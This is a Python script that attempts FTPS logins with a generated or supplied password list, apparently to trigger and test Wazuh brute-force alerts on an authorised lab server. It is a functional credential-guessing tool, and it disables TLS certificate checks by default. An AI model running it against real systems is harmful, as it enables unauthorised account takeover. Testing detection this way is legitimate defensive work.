#!/usr/bin/env python3
"""
ftp_ftps_brutetest.py

Controlled FTPS (explicit TLS) login attempt script for testing Wazuh alerts
(run only against systems you own/are authorized to test).

Usage examples:
    python3 ftp_ftps_brutetest.py --host 192.168.1.133 --port 21 --user ftpu
    python3 ftp_ftps_brutetest.py --host 192.168.1.133 --user ftpu --password-file pwlist.txt --delay 0.5 --verify-ssl True
"""

import ftplib
import argparse
import socket
import time
import csv
from datetime import datetime
import random
import sys
import ssl

DEFAULT_HOST = "192.168.1.133"
DEFAULT_PORT = 21
DEFAULT_USER = "ftpu"
DEFAULT_DELAY = 1.0
DEFAULT_TIMEOUT = 10
DEFAULT_LOG = "ftp_ftps_brutetest_log.csv"


def generate_passwords(n=100):
    base = [
        "password", "123456", "admin", "letmein", "welcome", "qwerty", "ftp123",
        "password1", "changeme", "secret", "test123", "111111", "iloveyou",
        "administrator", "root", "1234", "abcd1234", "passw0rd", "admin123", "localpass"
    ]
    pw_list = []
    for i in range(n):
        b = random.choice(base)
        suffix = str(1000 + i)
        if i % 3 == 0:
            candidate = f"{b}{suffix}"
        elif i % 3 == 1:
            candidate = f"{b}{suffix[::-1]}"
        else:
            candidate = f"{b.capitalize()}{i}"
        pw_list.append(candidate)
    return pw_list


def load_passwords_from_file(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if line.strip()]
    return lines[:100] if len(lines) >= 100 else lines


def attempt_ftps_login(host, port, user, password, timeout, verify_ssl):
    """
    Use explicit FTPS (AUTH TLS) with proper sequence:
      1) connect()
      2) auth() -> TLS handshake on control channel
      3) prot_p() -> protect data channel
      4) login()
    Returns (success: bool, message: str)
    """
    # Create SSL context depending on verify_ssl flag
    if verify_ssl:
        context = ssl.create_default_context()
    else:
        # insecure: do not verify certs (useful for self-signed test servers)
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

    ftps = ftplib.FTP_TLS(context=context)
    ftps.sock = None
    try:
        ftps.connect(host=host, port=port, timeout=timeout)
        # Ask server to switch to TLS (AUTH TLS), then wrap control channel
        ftps.auth()    # sends "AUTH TLS" and wraps control channel
        # Now set data channel protection to Private for subsequent transfers
        ftps.prot_p()  # sends "PBSZ 0" then "PROT P" (ftplib handles PBSZ)
        # Now log in over the encrypted control channel
        ftps.login(user=user, passwd=password)
        # if login succeeded, optionally list or quit cleanly
        ftps.quit()
        return True, "Login successful (FTPS)"
    except ftplib.error_perm as e:
        # Authentication failed (e.g., 530)
        try:
            ftps.close()
        except Exception:
            pass
        return False, f"Auth failed: {e}"
    except (ftplib.error_temp, ftplib.error_reply, socket.timeout, ConnectionRefusedError, OSError) as e:
        try:
            ftps.close()
        except Exception:
            pass
        return False, f"Network/FTP error: {repr(e)}"
    except ssl.SSLError as e:
        try:
            ftps.close()
        except Exception:
            pass
        return False, f"SSL error: {repr(e)}"
    except Exception as e:
        try:
            ftps.close()
        except Exception:
            pass
        return False, f"Other error: {repr(e)}"


def main():
    parser = argparse.ArgumentParser(description="Controlled FTPS login tester (authorized testing only).")
    parser.add_argument("--host", default=DEFAULT_HOST, help="FTPS host/IP (default: 192.168.1.133)")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="FTPS port (default: 21)")
    parser.add_argument("--user", default=DEFAULT_USER, help="Username to test")
    parser.add_argument("--password-file", help="File with passwords, one per line (optional)")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Delay between attempts in seconds (default: 1.0)")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="Socket timeout for connections (default: 10)")
    parser.add_argument("--log-file", default=DEFAULT_LOG, help="CSV logfile path (default: ftp_ftps_brutetest_log.csv)")
    parser.add_argument("--stop-on-success", type=lambda x: x.lower() in ("true", "1", "yes"), default=True,
                        help="Stop after first successful login? (default: True). Use False to try all passwords.")
    parser.add_argument("--no-randomize", action="store_true", help="Do not randomize password order (default: randomize)")
    parser.add_argument("--verify-ssl", type=lambda x: x.lower() in ("true", "1", "yes"), default=False,
                        help="Verify server TLS certificate? (default: False — useful for self-signed test servers)")
    args = parser.parse_args()

    if args.password_file:
        try:
            passwords = load_passwords_from_file(args.password_file)
            if not passwords:
                print("Password file was empty. Exiting.")
                sys.exit(1)
        except Exception as e:
            print(f"Failed to read password file: {e}")
            sys.exit(1)
    else:
        passwords = generate_passwords(100)

    if not args.no_randomize:
        random.shuffle(passwords)

    print(f"Starting FTPS login test: host={args.host}:{args.port} user={args.user} attempts={len(passwords)} delay={args.delay}s verify_ssl={args.verify_ssl}")

    csv_fields = ["timestamp", "host", "port", "username", "password_tried", "result", "message", "elapsed_ms"]
    with open(args.log_file, "w", newline="", encoding="utf-8") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=csv_fields)
        writer.writeheader()

        for idx, pw in enumerate(passwords, start=1):
            t0 = time.time()
            success, message = attempt_ftps_login(args.host, args.port, args.user, pw, timeout=args.timeout, verify_ssl=args.verify_ssl)
            elapsed_ms = int((time.time() - t0) * 1000)
            timestamp = datetime.utcnow().isoformat() + "Z"
            result = "SUCCESS" if success else "FAIL"

            print(f"[{idx}/{len(passwords)}] {timestamp} try='{pw}' -> {result} ({message}) elapsed={elapsed_ms}ms")

            writer.writerow({
                "timestamp": timestamp,
                "host": args.host,
                "port": args.port,
                "username": args.user,
                "password_tried": pw,
                "result": result,
                "message": message,
                "elapsed_ms": elapsed_ms
            })
            csvfile.flush()

            if success and args.stop_on_success:
                print("Successful login found and stop_on_success=True -> stopping further attempts.")
                break

            if idx < len(passwords):
                try:
                    time.sleep(args.delay)
                except KeyboardInterrupt:
                    print("Interrupted by user. Exiting.")
                    break

    print(f"Test finished. Log written to {args.log_file}")


if __name__ == "__main__":
    main()
